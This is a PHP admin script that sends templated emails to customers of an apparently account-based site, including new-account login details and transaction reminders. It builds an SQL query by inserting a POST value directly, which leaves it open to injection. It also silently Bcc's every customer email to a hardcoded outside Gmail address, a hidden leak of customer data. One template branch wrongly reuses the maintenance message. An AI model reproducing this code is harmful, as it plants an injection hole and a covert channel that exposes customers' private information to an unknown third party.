<?php 
session_start();
require('../things/sources/conn_auth.php');
require('../things/sources/customInfo.php');
require('../things/sources/config.php');
require('message_template.php');






$whoto = $_POST['USER-ID'];
$mess1 = $_POST['MESS1'];



if( $_POST['MESS-TEMP']=="NEW-ACC"){
   $message_temp = $new_account_message;
    $message_subject = 'New Account Login Detail';
    $composed_message = '';
    
} elseif ( $_POST['MESS-TEMP']=="TRAS-REM") {
  $message_temp = $transaction_reminder;
  $message_subject = 'Trasaction Reminder';    
    $composed_message = '';
    
} elseif ( $_POST['MESS-TEMP']=="SYS-MNT") {
  $message_temp = $system_maintenance;
  $message_subject = 'System Maintenance';    
    $composed_message = '';
    
} elseif ( $_POST['MESS-TEMP']=="B-DAY") {
  $message_temp = $system_maintenance;
  $message_subject = 'System Maintenance';    
    $composed_message = $_POST['SUBJECT'];        
    
}else{ 
   
    $composed_message = " $compose_head  $mess1   $compose_foot ";
    $message_subject = $_POST['SUBJECT'];;
    }





                                


                       $seLInfo = $conn->query("select * from customer_info where customer_id = '" . $whoto . "'") or die($conn->error);
                          $rowInfo = $seLInfo->fetch_array();
				  
				        
						





$subject = $message_subject;    
$to = $rowInfo['email'];
$from ="support@$domain";
$noreply="noreply@$domain";


 
// To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
 $adddate2=date(" d M Y ");
$headers = "From:' $site_name'<support@$domain>\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$trans_id = substr(time()*rand(), 0, 14);
// Create email headers

$headers .= "Bcc: aturosandaval@gmail.com \r\n";


        
        
        // customer email hearders
$subject2 = $message_subject;
$headers2 = "From:'Admin Mailer To $site_name'<transfer@$domain>\n";
$headers2 .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 


    
 
// Compose a simple HTML email message
$message = '<html><body>';
$message .= '<div style="width:200px; display:block"><img src="'.$site_url.'/things/img/logo.png" width="90" height="64" /></div>';


 
 $message .=''.$message_temp.'';
$message .= '<p>'.$composed_message.'</p>';

$message .= '</div>';
$message .= '</body></html>';
    
    
    

    
 
// Sending email
    {   
    mail($admin_email,$subject2,$message,$headers2);
    }


  
 
if(mail($to,$subject,$message,$headers)){
    
    if(isset($_POST['ActionThisUser'])){
        
    header('location:sendemail_to_this_user.php?msg=Message successfully Sent to '.$rowInfo['cust_name'] . '&id=' .$whoto);
    }else{
        header('location:sendemail.php?msg=Message successfully Sent to '.$rowInfo['cust_name'] . '');
    }
 
}

 
?>
